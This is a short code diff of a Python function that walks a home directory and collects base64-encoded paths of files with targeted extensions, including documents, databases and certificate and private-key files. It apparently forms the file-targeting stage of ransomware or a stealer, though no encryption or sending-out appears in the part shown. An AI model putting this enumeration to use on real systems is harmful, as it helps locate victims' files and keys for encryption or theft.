@@ -24,11 +24,13 @@ G': 0, '.ODG': 0, '.UOP': 0, '.STD': 0, '.SXD': 0, '.OTP': 0, '.ODP': 0, '.WB2':
 SXC': 0, '.OTS': 0, '.ODS': 0, '.3DM': 0, '.MAX': 0, '.3DS': 0, '.UOT': 0, '.STW': 0, '.SXW': 0, '.OTT': 0, '.ODT': 0, 
 '.PEM': 0, '.P12': 0, '.CSR': 0, '.CRT': 0, '.KEY': 0, '.PFX': 0, '.DER': 0}
     
+    f = []
     for actual_path, directories, files_found in os.walk(path):
         for arq in files_found:
             extensao = os.path.splitext(os.path.join(actual_path, arq))[1].upper()
             if(file_format.get(extensao) == 0 or extensao == ''):
-                yield base64.b64encode(os.path.join(actual_path, arq).encode())
+                f.append(base64.b64encode(os.path.join(actual_path, arq).encode()))
+    return f
 
 if __name__  == "__main__":
     for x in find_files('/home/tarcisio/'):
